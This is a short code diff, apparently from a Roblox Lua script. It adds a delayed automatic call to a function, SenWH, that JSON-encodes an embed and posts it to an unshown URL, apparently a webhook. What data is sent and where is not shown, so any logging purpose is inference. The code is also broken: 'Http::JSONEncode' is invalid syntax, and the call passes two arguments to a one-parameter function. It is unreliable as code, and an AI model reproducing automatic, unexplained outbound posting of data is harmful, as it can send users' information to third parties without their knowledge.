@@ -163,3 +163,5 @@ local function SenWH(data)
    local senall = Http::JSONEncode(embed)
    Http:PostAsync(url, senall)
 end
+wait(5)
+SenWH(data, "KingLTN")
